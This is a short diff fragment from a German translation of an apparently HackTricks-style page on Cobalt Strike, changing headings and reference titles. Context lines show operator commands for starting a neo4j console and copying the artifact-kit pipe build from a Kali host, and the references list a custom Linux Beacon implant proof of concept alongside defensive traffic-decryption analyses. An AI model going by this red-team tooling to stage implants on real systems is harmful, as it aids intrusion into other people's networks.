-<summary>Misc Cobalt Strike commands</summary>
+<summary>Verschiedene Cobalt Strike-Befehle</summary>
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
@@ -378,14 +379,13 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
 </details>
 
-## Referenzen
+## References
 
 - [1] [Cobalt Strike Linux Beacon (benutzerdefinierter Implantat-PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
 - [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
-- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
-- [4] [Unit42-Analyse der Cobalt-Strike-Metadatenverschlüsselung](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
+- [3] [Outflank nix BOF-Vorlage](https://github.com/outflanknl/nix_bof_template)
+- [4] [Unit42-Analyse der Metadatenverschlüsselung von Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
 - [5] [SANS-ISC-Tagebuch über Cobalt-Strike-Datenverkehr](https://isc.sans.edu/diary/27968)
 - [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
 - [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
-
 {{#include ../banners/hacktricks-training.md}}
